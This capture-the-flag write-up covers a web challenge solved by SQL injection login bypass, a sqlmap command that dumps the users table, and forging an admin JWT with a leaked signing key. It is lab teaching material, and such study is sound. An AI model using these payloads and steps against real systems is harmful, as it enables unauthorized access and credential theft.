# This_WEB_Too_Simple Write-up

## Summary

This write-up demonstrates the process of exploiting a web application to gain unauthorized admin access. The strategy involves using a SQL injection (SQLi) to bypass login authentication, extracting a secret key, and then modifying a JWT token to escalate privileges to an admin role.

## Steps

### 1. Discovery of `robots.txt`

The `robots.txt` file, located at the web server's root, contained directives that hinted at potential attack vectors:

```plaintext
User-agent: *
Disallow: /
Disallow: /login
Disallow: /admin
```

### 2. SQL Injection and Login

A SQL injection vulnerability was identified on the login page (`login.html`). The vulnerability is exploited as follows:

#### Manual SQL Injection

By entering a SQL injection payload in the login fields, authentication can be bypassed. For instance:

```sql
' OR '1'='1' --
```

This payload logs in as a non-admin user by bypassing the authentication check.

#### Automated SQL Injection with sqlmap

Alternatively, sqlmap can be used to exploit the vulnerability and extract database information:

```bash
sqlmap -r request.txt --ignore-code=401 -p username -D SQLite_masterdb -T users --dump
```

This command instructs sqlmap to ignore any HTTP 401 unauthorized error codes, target the `username` POST parameter, select the SQLite_masterdb database, list the contents of the `users` table, and dump the data.

After executing the sqlmap command, the structure of the database was retrieved, revealing a table named `users` with columns for `id`, `username`, and `password`. The SQL command used to create the `users` table is:

```
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL
)
```

Furthermore, an entry within the `users` table was extracted, indicating the presence of user credentials:

```
Database: <current>
Table: users
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | user123  | user     |
+----+----------+----------+
```

### 3. Extracting the Secret Key

Post successful SQLi login, the application reveals a key, which is the secret used for signing JWT tokens. This key can be found in the application's response.

### 4. Modifying the JWT Token

With the secret key, visit [jwt.io](https://jwt.io) and paste the token in the Encoded section. Modify the `role` from non-admin to admin and use the secret key to regenerate a valid signature.

### 5. Accessing the Admin Page

With the modified admin JWT token, send a request to the `/admin` page. The admin page should now be accessible, revealing the flag.
